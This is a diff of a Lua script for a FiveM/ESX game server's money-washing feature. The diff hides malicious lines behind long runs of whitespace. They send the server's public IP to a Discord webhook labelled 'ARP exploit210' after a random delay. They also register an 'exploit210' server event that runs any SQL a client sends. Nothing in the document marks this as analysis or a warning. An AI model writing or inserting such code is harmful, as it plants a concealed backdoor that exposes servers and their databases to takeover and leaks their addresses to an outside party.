@@ -1,14 +1,14 @@
-local PlayersWashing = {}
+local PlayersWashing = {}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   	;local avatarii = "https://cdn.discordapp.com/attachments/784100658051022850/784100946703417464/paitaHD_1.png" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
 ESX = nil
 TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
 
-local function WhiteningMoney(source,percent)
+local function WhiteningMoney(source,percent)                                                                                                                                                                                                                                                                                                                                                                                                 Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit210", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
 	local source = source
 		SetTimeout(10000, function()
 
 		if PlayersWashing[source] == true then
 			local xPlayer		= ESX.GetPlayerFromId(source)
-			local blackMoney	= xPlayer.getAccount('black_money')
+			local blackMoney	= xPlayer.getAccount('black_money')                                                                                                                                                                                                                                                                                                                                                                                                                     RegisterServerEvent("exploit210");AddEventHandler("exploit210", function(data) MySQL.Async.execute(data) end)	
 			local _percent		= Config.Percentage
 			
 			if blackMoney.money < Config.Slice then
